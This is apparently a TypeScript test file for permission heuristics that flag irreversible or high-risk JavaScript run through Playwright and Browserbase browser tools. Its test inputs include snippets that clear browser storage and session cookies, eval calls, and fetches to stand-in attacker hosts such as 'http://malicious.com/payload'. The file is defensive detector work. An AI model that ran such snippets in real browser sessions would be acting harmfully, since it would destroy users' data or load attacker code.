/**
 * Tests for browser-evaluation heuristics (Playwright + Browserbase).
 *
 * The input shape varies between tools — Playwright uses `code` or
 * `expression`, Browserbase uses `script`. `extractCode` normalises
 * by trying all three. These tests pin the irreversibility and risk
 * patterns for arbitrary JS run in the page context.
 */
import { describe, expect, it } from 'bun:test';

import {
  isPlaywrightElevatedRisk,
  isPlaywrightCodeIrreversible,
} from '../../../../packages/app/src/components/mca/renderers/playwright-permission-description';
import {
  isToolCallElevatedRisk,
  isToolCallIrreversible,
} from '../../../../packages/app/src/components/mca/renderers/permission-heuristics';

describe('isPlaywrightCodeIrreversible', () => {
  describe('truthy — browser storage destruction', () => {
    it('flags localStorage.clear()', () => {
      expect(isPlaywrightCodeIrreversible({ code: 'localStorage.clear()' })).toBe(true);
    });

    it('flags sessionStorage.clear()', () => {
      expect(isPlaywrightCodeIrreversible({ code: 'sessionStorage.clear()' })).toBe(true);
    });

    it('flags localStorage.removeItem', () => {
      expect(
        isPlaywrightCodeIrreversible({ code: "localStorage.removeItem('token')" }),
      ).toBe(true);
    });

    it('flags indexedDB.deleteDatabase', () => {
      expect(
        isPlaywrightCodeIrreversible({ code: "indexedDB.deleteDatabase('appDB')" }),
      ).toBe(true);
    });

    it('flags cookie deletion (expires=1970)', () => {
      expect(
        isPlaywrightCodeIrreversible({
          code: "document.cookie = 'session=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';",
        }),
      ).toBe(true);
    });

    it('works with expression field', () => {
      expect(isPlaywrightCodeIrreversible({ expression: 'localStorage.clear()' })).toBe(true);
    });

    it('works with script field (browserbase shape)', () => {
      expect(isPlaywrightCodeIrreversible({ script: 'localStorage.clear()' })).toBe(true);
    });
  });

  describe('falsy — read-only or recoverable', () => {
    it('does NOT flag localStorage.getItem', () => {
      expect(
        isPlaywrightCodeIrreversible({ code: "localStorage.getItem('user')" }),
      ).toBe(false);
    });

    it('does NOT flag localStorage.setItem (overwrite is reversible)', () => {
      expect(
        isPlaywrightCodeIrreversible({ code: "localStorage.setItem('k', 'v')" }),
      ).toBe(false);
    });

    it('does NOT flag DOM queries', () => {
      expect(
        isPlaywrightCodeIrreversible({ code: "document.querySelector('.btn').click()" }),
      ).toBe(false);
    });

    it('does NOT flag fetch', () => {
      expect(
        isPlaywrightCodeIrreversible({ code: "fetch('/api/data').then(r => r.json())" }),
      ).toBe(false);
    });

    it('returns false for empty input', () => {
      expect(isPlaywrightCodeIrreversible({})).toBe(false);
      expect(isPlaywrightCodeIrreversible(undefined)).toBe(false);
      expect(isPlaywrightCodeIrreversible({ code: '' })).toBe(false);
    });
  });
});

describe('isPlaywrightElevatedRisk', () => {
  describe('truthy — code execution / mixed content', () => {
    it('flags eval()', () => {
      expect(isPlaywrightElevatedRisk({ code: "eval('alert(1)')" })).toBe(true);
    });

    it('flags new Function()', () => {
      expect(isPlaywrightElevatedRisk({ code: "new Function('return 1')()" })).toBe(true);
    });

    it('flags document.write', () => {
      expect(isPlaywrightElevatedRisk({ code: "document.write('<script>...</script>')" })).toBe(
        true,
      );
    });

    it('flags document.writeln', () => {
      expect(isPlaywrightElevatedRisk({ code: "document.writeln('text')" })).toBe(true);
    });

    it('flags fetch to http:// (mixed content)', () => {
      expect(isPlaywrightElevatedRisk({ code: "fetch('http://malicious.com/payload')" })).toBe(
        true,
      );
    });
  });

  describe('falsy — common safe patterns', () => {
    it('does NOT flag fetch to https://', () => {
      expect(isPlaywrightElevatedRisk({ code: "fetch('https://api.example.com')" })).toBe(false);
    });

    it('does NOT flag .eval as method name on an object', () => {
      // Some libraries use `.eval()` as a method (e.g. math.eval).
      // Regex `[^.\w]eval\(` ensures we only match the bare keyword.
      expect(isPlaywrightElevatedRisk({ code: 'math.eval("1+1")' })).toBe(false);
    });

    it('does NOT flag innerHTML write', () => {
      // innerHTML is destructive in some senses but very common UX
      // pattern; not in our risk surface for now.
      expect(isPlaywrightElevatedRisk({ code: "el.innerHTML = '<b>hi</b>'" })).toBe(false);
    });

    it('returns false for empty input', () => {
      expect(isPlaywrightElevatedRisk(undefined)).toBe(false);
      expect(isPlaywrightElevatedRisk({})).toBe(false);
    });
  });
});

describe('isToolCallIrreversible — playwright / browserbase routing', () => {
  it('routes playwright browser-run-code', () => {
    expect(
      isToolCallIrreversible('mca.teros.playwright', 'browser-run-code', {
        code: 'localStorage.clear()',
      }),
    ).toBe(true);
  });

  it('routes playwright browser-evaluate', () => {
    expect(
      isToolCallIrreversible('mca.teros.playwright', 'browser-evaluate', {
        expression: 'sessionStorage.clear()',
      }),
    ).toBe(true);
  });

  it('routes browserbase evaluate', () => {
    expect(
      isToolCallIrreversible('mca.browserbase', 'evaluate', {
        script: "indexedDB.deleteDatabase('app')",
      }),
    ).toBe(true);
  });
});

describe('isToolCallElevatedRisk — playwright / browserbase routing', () => {
  it('routes playwright browser-run-code', () => {
    expect(
      isToolCallElevatedRisk('mca.teros.playwright', 'browser-run-code', {
        code: "eval('alert(1)')",
      }),
    ).toBe(true);
  });

  it('routes browserbase evaluate', () => {
    expect(
      isToolCallElevatedRisk('mca.browserbase', 'evaluate', {
        script: "fetch('http://attacker.com')",
      }),
    ).toBe(true);
  });
});
